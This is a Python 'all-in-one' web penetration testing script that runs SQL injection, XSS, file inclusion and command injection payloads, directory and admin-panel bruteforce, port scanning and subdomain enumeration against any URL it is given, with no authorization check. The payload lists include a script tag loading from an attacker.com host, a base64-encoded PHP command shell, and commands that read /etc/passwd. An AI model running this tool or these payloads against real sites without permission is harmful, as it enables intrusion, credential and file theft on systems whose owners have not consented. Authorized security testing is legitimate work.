#!/usr/bin/env python3
"""
Web Vulnerability Scanner - All-in-One Penetration Testing Tool
Automated security testing suite for websites
"""

import requests
import re
import socket
import ssl
import json
import time
import subprocess
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class WebScanner:
    def __init__(self, target_url, threads=10):
        self.target_url = target_url.rstrip('/')
        self.domain = urlparse(target_url).netloc
        self.threads = threads
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        self.vulnerabilities = []
        self.findings = {
            'sql_injection': [],
            'xss': [],
            'lfi': [],
            'rfi': [],
            'open_redirect': [],
            'xxe': [],
            'ssrf': [],
            'command_injection': [],
            'directory_listing': [],
            'sensitive_files': [],
            'admin_panels': [],
            'subdomains': [],
            'open_ports': [],
            'ssl_issues': [],
            'cms_info': {},
            'headers': {}
        }
        
    def banner(self):
        print("""
╔═══════════════════════════════════════════════════════╗
║      WEB VULNERABILITY SCANNER & PENTEST TOOL        ║
║         Automated Security Assessment Suite          ║
╚═══════════════════════════════════════════════════════╝
        """)
        print(f"[+] Target: {self.target_url}")
        print(f"[+] Domain: {self.domain}")
        print(f"[+] Threads: {self.threads}")
        print(f"[+] Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        print("="*60)
    
    # ============================================
    # 1. SQL INJECTION TESTING
    # ============================================
    
    def test_sql_injection(self):
        print("\n[*] Testing for SQL Injection vulnerabilities...")
        
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR 1=1--",
            "' OR 'a'='a",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "1' ORDER BY 1--+",
            "1' ORDER BY 2--+",
            "1' ORDER BY 3--+",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION ALL SELECT NULL,NULL,NULL--",
            "' AND 1=CONVERT(int, (SELECT @@version))--"
        ]
        
        error_indicators = [
            'mysql', 'sql', 'syntax error', 'database', 'warning',
            'postgresql', 'sqlite', 'microsoft', 'oracle',
            'odbc', 'jdbc', 'error in your sql', 'mysql_fetch',
            'num_rows', 'query failed', 'quoted string'
        ]
        
        # Find forms and parameters
        try:
            response = self.session.get(self.target_url, timeout=10)
            forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
            
            # Extract URL parameters
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)
            
            # Test URL parameters
            for param in params:
                for payload in sql_payloads:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    
                    test_url = f"{self.target_url.split('?')[0]}?{param}={payload}"
                    
                    try:
                        test_response = self.session.get(test_url, timeout=5)
                        
                        for indicator in error_indicators:
                            if indicator in test_response.text.lower():
                                vuln = {
                                    'type': 'SQL Injection',
                                    'severity': 'HIGH',
                                    'url': test_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'indicator': indicator
                                }
                                self.findings['sql_injection'].append(vuln)
                                print(f"  [!] SQLi found: {param} - {payload[:30]}...")
                                break
                                
                    except:
                        continue
                        
        except Exception as e:
            print(f"  [-] SQL injection test error: {e}")
        
        print(f"  [+] SQL Injection test complete: {len(self.findings['sql_injection'])} vulnerabilities found")
    
    # ============================================
    # 2. XSS (Cross-Site Scripting) TESTING
    # ============================================
    
    def test_xss(self):
        print("\n[*] Testing for XSS vulnerabilities...")
        
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg/onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
            '<input onfocus=alert("XSS") autofocus>',
            '<select onfocus=alert("XSS") autofocus>',
            '<textarea onfocus=alert("XSS") autofocus>',
            '<marquee onstart=alert("XSS")>',
            '<div onmouseover=alert("XSS")>hover</div>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            '<script>alert(/XSS/)</script>',
            '<img src=x:alert(alt) onerror=eval(src) alt=xss>',
            '<svg><script>alert("XSS")</script></svg>',
            '<script>alert(document.cookie)</script>',
            'javascript:alert("XSS")',
            '<img src=javascript:alert("XSS")>',
            '<body background="javascript:alert(\'XSS\')">',
            '<isindex type=image src=1 onerror=alert("XSS")>',
            '<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>'
        ]
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in xss_payloads:
                    test_url = f"{self.target_url.split('?')[0]}?{param}={payload}"
                    
                    try:
                        test_response = self.session.get(test_url, timeout=5)
                        
                        # Check if payload is reflected in response
                        if payload in test_response.text or payload.replace('"', "'") in test_response.text:
                            vuln = {
                                'type': 'XSS (Reflected)',
                                'severity': 'MEDIUM',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload
                            }
                            self.findings['xss'].append(vuln)
                            print(f"  [!] XSS found: {param} - {payload[:30]}...")
                            
                    except:
                        continue
                        
        except Exception as e:
            print(f"  [-] XSS test error: {e}")
        
        print(f"  [+] XSS test complete: {len(self.findings['xss'])} vulnerabilities found")
    
    # ============================================
    # 3. LFI/RFI (File Inclusion) TESTING
    # ============================================
    
    def test_file_inclusion(self):
        print("\n[*] Testing for LFI/RFI vulnerabilities...")
        
        lfi_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '/etc/passwd',
            'C:\\windows\\win.ini',
            '/var/www/html/index.php',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://input',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
            'expect://id',
            '/proc/self/environ',
            '../../../../../../../etc/passwd',
            '../../../../../../../../../../etc/passwd%00',
        ]
        
        lfi_indicators = [
            'root:', 'bin:', 'daemon:', 'nobody:',
            '[extensions]', '[fonts]',
            'PHP Version', 'System',
        ]
        
        try:
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in lfi_payloads:
                    test_url = f"{self.target_url.split('?')[0]}?{param}={payload}"
                    
                    try:
                        test_response = self.session.get(test_url, timeout=5)
                        
                        for indicator in lfi_indicators:
                            if indicator in test_response.text:
                                vuln = {
                                    'type': 'LFI (Local File Inclusion)',
                                    'severity': 'HIGH',
                                    'url': test_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'indicator': indicator
                                }
                                self.findings['lfi'].append(vuln)
                                print(f"  [!] LFI found: {param} - {payload}")
                                break
                                
                    except:
                        continue
                        
        except Exception as e:
            print(f"  [-] LFI/RFI test error: {e}")
        
        print(f"  [+] LFI/RFI test complete: {len(self.findings['lfi'])} vulnerabilities found")
    
    # ============================================
    # 4. COMMAND INJECTION TESTING
    # ============================================
    
    def test_command_injection(self):
        print("\n[*] Testing for Command Injection vulnerabilities...")
        
        cmd_payloads = [
            '; id',
            '| id',
            '& id',
            '&& id',
            '|| id',
            '; whoami',
            '| whoami',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '`id`',
            '$(id)',
            '; ls -la',
            '| dir',
            '; ping -c 4 127.0.0.1',
        ]
        
        cmd_indicators = [
            'uid=', 'gid=', 'groups=',
            'root', 'bin', 'daemon',
            'volume serial number',
            'directory of',
            'bytes free',
        ]
        
        try:
            parsed = urlparse(self.target_url)
            params = parse_qs(parsed.query)
            
            for param in params:
                for payload in cmd_payloads:
                    test_url = f"{self.target_url.split('?')[0]}?{param}={payload}"
                    
                    try:
                        test_response = self.session.get(test_url, timeout=5)
                        
                        for indicator in cmd_indicators:
                            if indicator.lower() in test_response.text.lower():
                                vuln = {
                                    'type': 'Command Injection',
                                    'severity': 'CRITICAL',
                                    'url': test_url,
                                    'parameter': param,
                                    'payload': payload,
                                    'indicator': indicator
                                }
                                self.findings['command_injection'].append(vuln)
                                print(f"  [!] Command Injection found: {param}")
                                break
                                
                    except:
                        continue
                        
        except Exception as e:
            print(f"  [-] Command injection test error: {e}")
        
        print(f"  [+] Command injection test complete: {len(self.findings['command_injection'])} vulnerabilities found")
    
    # ============================================
    # 5. DIRECTORY BRUTEFORCE
    # ============================================
    
    def directory_bruteforce(self):
        print("\n[*] Bruteforcing directories and files...")
        
        common_paths = [
            '/admin', '/administrator', '/wp-admin', '/cpanel', '/admin.php',
            '/login', '/login.php', '/signin', '/user/login', '/auth',
            '/backup', '/backups', '/backup.sql', '/backup.zip', '/db.sql',
            '/config', '/config.php', '/configuration.php', '/settings.php',
            '/phpmyadmin', '/pma', '/mysql', '/database',
            '/uploads', '/upload', '/files', '/images', '/img',
            '/.git', '/.svn', '/.env', '/.htaccess', '/web.config',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml',
            '/test', '/testing', '/dev', '/debug', '/console',
            '/api', '/rest', '/graphql', '/swagger',
            '/readme.txt', '/license.txt', '/changelog.txt',
            '/install', '/install.php', '/setup', '/setup.php',
            '/shell.php', '/c99.php', '/r57.php', '/adminer.php',
            '/.DS_Store', '/composer.json', '/package.json',
            '/server-status', '/server-info', '/trace.axd',
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.check_path, path): path for path in common_paths}
            
            for future in as_completed(futures):
                path = futures[future]
                try:
                    result = future.result()
                    if result:
                        self.findings['sensitive_files'].append(result)
                        print(f"  [+] Found: {result['url']} [{result['status']}]")
                except:
                    pass
        
        print(f"  [+] Directory bruteforce complete: {len(self.findings['sensitive_files'])} files found")
    
    def check_path(self, path):
        url = urljoin(self.target_url, path)
        try:
            response = self.session.get(url, timeout=5, allow_redirects=False)
            if response.status_code in [200, 301, 302, 403]:
                return {
                    'url': url,
                    'status': response.status_code,
                    'size': len(response.content)
                }
        except:
            pass
        return None
    
    # ============================================
    # 6. ADMIN PANEL FINDER
    # ============================================
    
    def find_admin_panels(self):
        print("\n[*] Searching for admin panels...")
        
        admin_paths = [
            '/admin', '/administrator', '/admin.php', '/admin.html',
            '/admin/login', '/admin/login.php', '/admin/admin.php',
            '/wp-admin', '/wp-login.php',
            '/cpanel', '/controlpanel', '/control',
            '/user/admin', '/moderator', '/webadmin',
            '/adminarea', '/adminpanel', '/admin1',
            '/admin_area', '/admin_login', '/panel',
            '/siteadmin', '/adminzone', '/bb-admin',
            '/member', '/members', '/manage', '/manager',
            '/letmein', '/superuser', '/access',
            '/administrator/index.php', '/administrator/login.php',
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.check_admin, path): path for path in admin_paths}
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.findings['admin_panels'].append(result)
                        print(f"  [+] Admin panel found: {result['url']}")
                except:
                    pass
        
        print(f"  [+] Admin panel search complete: {len(self.findings['admin_panels'])} found")
    
    def check_admin(self, path):
        url = urljoin(self.target_url, path)
        try:
            response = self.session.get(url, timeout=5)
            if response.status_code == 200:
                if 'password' in response.text.lower() and 'login' in response.text.lower():
                    return {'url': url, 'status': 'Found'}
        except:
            pass
        return None
    
    # ============================================
    # 7. SUBDOMAIN ENUMERATION
    # ============================================
    
    def enumerate_subdomains(self):
        print("\n[*] Enumerating subdomains...")
        
        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'blog', 'dev', 'test',
            'staging', 'api', 'app', 'mobile', 'm', 'shop', 'store',
            'forum', 'help', 'support', 'cpanel', 'webmail', 'smtp',
            'pop', 'imap', 'ns1', 'ns2', 'mx', 'cdn', 'static',
            'portal', 'beta', 'alpha', 'demo', 'backup', 'old',
        ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.check_subdomain, sub): sub for sub in common_subdomains}
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.findings['subdomains'].append(result)
                        print(f"  [+] Subdomain found: {result}")
                except:
                    pass
        
        print(f"  [+] Subdomain enumeration complete: {len(self.findings['subdomains'])} found")
    
    def check_subdomain(self, subdomain):
        domain = self.domain
        full_domain = f"{subdomain}.{domain}"
        
        try:
            socket.gethostbyname(full_domain)
            return full_domain
        except:
            return None
    
    # ============================================
    # 8. PORT SCANNING
    # ============================================
    
    def port_scan(self):
        print("\n[*] Scanning common ports...")
        
        common_ports = [
            21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 465, 587,
            993, 995, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 8443
        ]
        
        host = socket.gethostbyname(self.domain)
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.check_port, host, port): port for port in common_ports}
            
            for future in as_completed(futures):
                port = futures[future]
                try:
                    if future.result():
                        service = self.get_service_name(port)
                        self.findings['open_ports'].append({'port': port, 'service': service})
                        print(f"  [+] Port {port} open ({service})")
                except:
                    pass
        
        print(f"  [+] Port scan complete: {len(self.findings['open_ports'])} open ports")
    
    def check_port(self, host, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((host, port))
        sock.close()
        return result == 0
    
    def get_service_name(self, port):
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
            80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS',
            445: 'SMB', 465: 'SMTPS', 587: 'SMTP', 993: 'IMAPS',
            995: 'POP3S', 1433: 'MSSQL', 3306: 'MySQL', 3389: 'RDP',
            5432: 'PostgreSQL', 5900: 'VNC', 6379: 'Redis',
            8080: 'HTTP-Alt', 8443: 'HTTPS-Alt'
        }
        return services.get(port, 'Unknown')
    
    # ============================================
    # 9. SSL/TLS SECURITY CHECK
    # ============================================
    
    def check_ssl(self):
        print("\n[*] Checking SSL/TLS security...")
        
        if not self.target_url.startswith('https'):
            print("  [!] Website not using HTTPS")
            self.findings['ssl_issues'].append('No HTTPS')
            return
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.domain, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                    cert = ssock.getpeercert()
                    
                    not_after = cert['notAfter']
                    print(f"  [+] Certificate expires: {not_after}")
                    
                    version = ssock.version()
                    print(f"  [+] TLS Version: {version}")
                    
                    if version in ['TLSv1', 'TLSv1.1', 'SSLv2', 'SSLv3']:
                        self.findings['ssl_issues'].append(f'Weak protocol: {version}')
                        print(f"  [!] Weak TLS version: {version}")
                        
        except Exception as e:
            print(f"  [-] SSL check error: {e}")
            self.findings['ssl_issues'].append(str(e))
    
    # ============================================
    # 10. CMS DETECTION
    # ============================================
    
    def detect_cms(self):
        print("\n[*] Detecting CMS...")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            content = response.text.lower()
            
            if 'wp-content' in content or 'wp-includes' in content:
                self.findings['cms_info']['name'] = 'WordPress'
                wp_version = re.search(r'<meta name="generator" content="wordpress ([0-9.]+)"', content)
                if wp_version:
                    self.findings['cms_info']['version'] = wp_version.group(1)
                print(f"  [+] WordPress detected")
            
            elif 'joomla' in content or '/components/com_' in content:
                self.findings['cms_info']['name'] = 'Joomla'
                print(f"  [+] Joomla detected")
            
            elif 'drupal' in content or 'sites/all/modules' in content:
                self.findings['cms_info']['name'] = 'Drupal'
                print(f"  [+] Drupal detected")
            
            elif 'magento' in content or 'mage/cookies.js' in content:
                self.findings['cms_info']['name'] = 'Magento'
                print(f"  [+] Magento detected")
            
            else:
                print("  [-] CMS not detected")
                
        except Exception as e:
            print(f"  [-] CMS detection error: {e}")
    
    # ============================================
    # 11. SECURITY HEADERS CHECK
    # ============================================
    
    def check_security_headers(self):
        print("\n[*] Checking security headers...")
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-XSS-Protection': 'XSS filter',
                'X-Content-Type-Options': 'MIME sniffing prevention',
                'Strict-Transport-Security': 'HTTPS enforcement',
                'Content-Security-Policy': 'Content injection protection',
                'X-Permitted-Cross-Domain-Policies': 'Cross-domain policy'
            }
            
            self.findings['headers']['present'] = []
            self.findings['headers']['missing'] = []
            
            for header, description in security_headers.items():
                if header in headers:
                    self.findings['headers']['present'].append(header)
                    print(f"  [+] {header}: {headers[header][:50]}")
                else:
                    self.findings['headers']['missing'].append(header)
                    print(f"  [!] Missing: {header} ({description})")
                    
        except Exception as e:
            print(f"  [-] Header check error: {e}")
    
    # ============================================
    # MAIN SCAN RUNNER
    # ============================================
    
    def run_all_tests(self):
        self.banner()
        
        tests = [
            ('SQL Injection', self.test_sql_injection),
            ('XSS', self.test_xss),
            ('File Inclusion', self.test_file_inclusion),
            ('Command Injection', self.test_command_injection),
            ('Directory Bruteforce', self.directory_bruteforce),
            ('Admin Panel Search', self.find_admin_panels),
            ('Subdomain Enumeration', self.enumerate_subdomains),
            ('Port Scanning', self.port_scan),
            ('SSL/TLS Check', self.check_ssl),
            ('CMS Detection', self.detect_cms),
            ('Security Headers', self.check_security_headers),
        ]
        
        for test_name, test_func in tests:
            try:
                test_func()
            except KeyboardInterrupt:
                print(f"\n[!] Scan interrupted by user")
                break
            except Exception as e:
                print(f"\n[-] Error in {test_name}: {e}")
        
        self.generate_report()
    
    # ============================================
    # REPORT GENERATION
    # ============================================
    
    def generate_report(self):
        print("\n" + "="*60)
        print("SCAN SUMMARY")
        print("="*60)
        
        total_vulns = (
            len(self.findings['sql_injection']) +
            len(self.findings['xss']) +
            len(self.findings['lfi']) +
            len(self.findings['command_injection'])
        )
        
        print(f"\n[+] Target: {self.target_url}")
        print(f"[+] Scan completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"\n[VULNERABILITIES FOUND: {total_vulns}]")
        print(f"  - SQL Injection: {len(self.findings['sql_injection'])}")
        print(f"  - XSS: {len(self.findings['xss'])}")
        print(f"  - LFI: {len(self.findings['lfi'])}")
        print(f"  - Command Injection: {len(self.findings['command_injection'])}")
        
        print(f"\n[INFORMATION GATHERING]")
        print(f"  - Sensitive files found: {len(self.findings['sensitive_files'])}")
        print(f"  - Admin panels found: {len(self.findings['admin_panels'])}")
        print(f"  - Subdomains found: {len(self.findings['subdomains'])}")
        print(f"  - Open ports: {len(self.findings['open_ports'])}")
        print(f"  - SSL issues: {len(self.findings['ssl_issues'])}")
        print(f"  - Missing security headers: {len(self.findings['headers'].get('missing', []))}")
        
        if self.findings['cms_info']:
            print(f"\n[CMS DETECTED]")
            print(f"  - Name: {self.findings['cms_info'].get('name', 'Unknown')}")
            if 'version' in self.findings['cms_info']:
                print(f"  - Version: {self.findings['cms_info']['version']}")
        
        # Save to JSON
        report_file = f"scan_report_{self.domain}_{int(time.time())}.json"
        with open(report_file, 'w') as f:
            json.dump(self.findings, f, indent=2)
        
        print(f"\n[+] Full report saved to: {report_file}")
        print("="*60 + "\n")

def main():
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 scanner.py <target_url> [threads]")
        print("Example: python3 scanner.py https://example.com 20")
        sys.exit(1)
    
    target_url = sys.argv[1]
    threads = int(sys.argv[2]) if len(sys.argv) > 2 else 10
    
    scanner = WebScanner(target_url, threads)
    
    try:
        scanner.run_all_tests()
    except KeyboardInterrupt:
        print("\n\n[!] Scan interrupted by user")
        scanner.generate_report()

if __name__ == "__main__":
    main()
